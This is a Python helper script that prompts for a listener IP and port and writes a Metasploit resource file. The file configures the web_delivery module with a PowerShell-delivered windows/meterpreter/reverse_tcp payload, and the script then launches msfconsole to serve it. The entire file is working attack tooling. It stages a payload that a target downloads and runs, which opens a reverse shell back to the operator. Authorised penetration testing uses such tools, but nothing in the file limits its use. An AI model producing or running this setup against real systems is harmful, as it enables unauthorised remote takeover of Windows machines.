import subprocess
import ipaddress
import tempfile
import os

def get_valid_ip():
    while True:
        ip = input("Enter your IP address (LHOST): ")
        try:
            ipaddress.ip_address(ip)
            return ip
        except ValueError:
            print("Invalid IP address. Please try again.")

def get_valid_port():
    while True:
        port = input("Enter the port number (LPORT): ")
        try:
            port_num = int(port)
            if 1 <= port_num <= 65535:
                return port
            else:
                print("Port number must be between 1 and 65535.")
        except ValueError:
            print("Invalid port number. Please enter a number.")

def main():
    print("Metasploit PowerShell Web Delivery Module Setup")
    
    lhost = get_valid_ip()
    lport = get_valid_port()
    
    rc_content = f"""use exploit/multi/script/web_delivery
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set TARGET 2
exploit -j
"""

    # Create a temporary RC file
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.rc') as temp_rc:
        temp_rc.write(rc_content)
        rc_file_path = temp_rc.name

    print(f"\nStarting Metasploit console with the generated RC file...")
    try:
        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while running Metasploit: {e}")
    finally:
        # Clean up the temporary RC file
        os.unlink(rc_file_path)

if __name__ == "__main__":
    main()
